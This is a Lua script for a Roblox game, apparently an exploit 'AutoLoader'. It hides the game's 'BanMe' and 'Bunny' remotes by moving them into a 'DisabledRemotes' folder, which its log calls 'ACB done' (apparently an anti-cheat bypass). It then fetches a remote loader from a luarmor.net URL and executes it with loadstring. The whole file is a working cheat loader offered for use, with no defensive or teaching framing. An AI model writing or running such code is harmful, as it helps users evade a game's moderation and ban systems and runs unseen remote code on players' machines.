local player = game.Players.LocalPlayer
print("[AutoLoader] Starting...")
task.wait(0.1)
print("[AutoLoader] Waiting for ReplicatedStorage.Remote...")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remote
local startTime = tick()
while not Remote do
    Remote = ReplicatedStorage:FindFirstChild("Remote")
    if tick() - startTime > 30 then
        print("[AutoLoader] Timeout waiting for Remote")
        return
    end
    task.wait(0.2)
end
print("[AutoLoader] Remote found!")

local disabledFolder = ReplicatedStorage:FindFirstChild("DisabledRemotes")
if not disabledFolder then
    disabledFolder = Instance.new("Folder")
    disabledFolder.Name = "DisabledRemotes"
    disabledFolder.Parent = ReplicatedStorage
end

local success, err = pcall(function()
    if Remote:FindFirstChild("BanMe") then
        Remote.BanMe.Parent = disabledFolder
        print("[DEBUG] BanMe Disabled")
    end
    task.wait(2.1)
    if Remote:FindFirstChild("Bunny") then
        Remote.Bunny.Parent = disabledFolder
        print("[DEBUG] Bunny Disabled")
    end
end)
if not success then
    print("[AutoLoader] Error moving remotes: " .. tostring(err))
end
print("[AutoLoader] ACB done, waiting to load script...")
task.wait(0.1)
print("[AutoLoader] Loading script...")
local loadSuccess, loadErr = pcall(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1e6ddc1413e293f1c1e9702a913ee2cb.lua"))()
end)
if not loadSuccess then
    print("[AutoLoader] Load error: " .. tostring(loadErr))
end
print("[AutoLoader] Done!")
